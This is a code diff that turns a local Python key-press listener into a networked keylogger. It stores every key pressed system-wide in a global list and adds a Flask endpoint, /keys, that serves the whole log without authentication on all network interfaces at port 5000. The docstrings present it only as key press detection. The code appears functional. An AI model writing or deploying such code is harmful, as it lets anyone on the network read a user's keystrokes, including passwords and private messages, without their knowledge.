@@ -1,6 +1,10 @@
 import evdev
 from evdev import InputDevice, categorize, ecodes
 from typing import Optional
+from flask import Flask, jsonify
+
+app = Flask(__name__)
+pressed_keys = []
 
 def get_keyboard_device() -> Optional[InputDevice]:
     """Finds and returns the first keyboard device."""
@@ -10,9 +14,9 @@ def get_keyboard_device() -> Optional[InputDevice]:
             return device
     return None
 
-def read_keypresses(device: InputDevice) -> str:
-    """Reads key presses from the given device and returns them as a string."""
-    pressed_keys = []
+def read_keypresses(device: InputDevice) -> None:
+    """Reads key presses from the given device and stores them."""
+    global pressed_keys
     try:
         for event in device.read_loop():
             if event.type == ecodes.EV_KEY:
@@ -20,10 +24,13 @@ def read_keypresses(device: InputDevice) -> str:
                 if key_event.keystate == key_event.key_down:
                     key_name = evdev.ecodes.KEY[event.code][4:]
                     pressed_keys.append(key_name)
-                    return "".join(pressed_keys)
     except KeyboardInterrupt:
         print("\nStopping key listener.")
-    return ""  # Return empty string if interrupted
+
+@app.route('/keys', methods=['GET'])
+def get_keys():
+    """Returns the pressed keys as JSON."""
+    return jsonify({"pressed_keys": pressed_keys})
 
 def main() -> None:
     """Main function to initialize and run key press detection."""
@@ -32,10 +39,10 @@ def main() -> None:
         print("No keyboard device found.")
         return
     print(f"Listening for key presses on: {device.path}")
-    while True:
-        key_string = read_keypresses(device)
-        if key_string:
-            print(f"Keys Pressed: {key_string}")
+    read_keypresses(device)
 
 if __name__ == "__main__":
-    main()
+    from threading import Thread
+    thread = Thread(target=main)
+    thread.start()
+    app.run(host='0.0.0.0', port=5000)
